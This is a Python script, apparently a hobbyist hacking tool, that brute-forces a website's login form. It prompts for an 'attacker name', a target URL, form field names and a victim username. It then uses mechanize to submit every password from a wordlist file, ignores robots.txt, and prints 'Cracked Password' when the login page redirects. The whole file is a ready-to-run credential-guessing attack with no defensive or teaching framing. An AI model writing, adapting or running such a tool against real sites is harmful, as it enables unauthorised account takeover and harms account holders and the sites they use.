from time import sleep
from getpass import getpass
import mechanize
import helper
import sys
import os

#Define Colors and Show Logo
colors = ["\033[0;31m", "\033[0;33m", "\033[0;35m", "\033[0;36m", "\033[0;34m", "\033[0;32m", "\033[0m"]
os.system("clear")
helper.showlogo()

#Check User Validation
pursuit_username = input("Enter Username: ")
pursuit_password = getpass("Enter Password: ")

#Start Control Statements
if pursuit_username == helper.details[0] and pursuit_password == helper.details[1]:
    print("Login Successfully")
    sleep(3)
    os.system("clear")
    helper.showlogo()
    attacker_name = input(f"{colors[0]}Enter Your Name: {colors[6]}")
    loginurl = input(f"{colors[1]}Enter Login URL: {colors[6]}")
    form_name = input(f"{colors[2]}Enter Email/Username Form Name: {colors[6]}")
    form_password_name = input(f"{colors[3]}Enter Password Form Name: {colors[6]}")
    user_info = input(f"{colors[4]}Enter Username/Email: {colors[6]}")

    #Set-up Mechanize
    os.system("clear")
    initialized = mechanize.Browser()
    initialized.set_handle_equiv(True)
    initialized.set_handle_redirect(True)
    initialized.set_handle_referer(True)
    initialized.set_handle_robots(False)
    initialized.open(loginurl)

    #Set-up Key
    wordlists = open("wordlists.txt","r")
    passwords = wordlists.read().splitlines()

    #Notification
    def successfully_cracked():
        print(f"{colors[5]}Congratulations{colors[6]}, {colors[0]}{attacker_name}{colors[6]}\n{colors[1]}Cracked Password: {colors[5]}{cracked_passwords}{colors[6]}")

    #Start Cracking
    for cracked_passwords in passwords:
        initialized.select_form(nr = 0)
        initialized.form[form_name] = user_info
        initialized.form[form_password_name] = cracked_passwords
        submission = initialized.submit()
        if submission.geturl() == loginurl:
            print(f"{colors[0]}Wrong Password: {cracked_passwords}{colors[6]}")
        else:
            os.system("clear")
            helper.showlogo()
            successfully_cracked()
            break
else:
    print("\033[0;31m[x] Wrong Login Information\033[0;32m")
    sys.exit()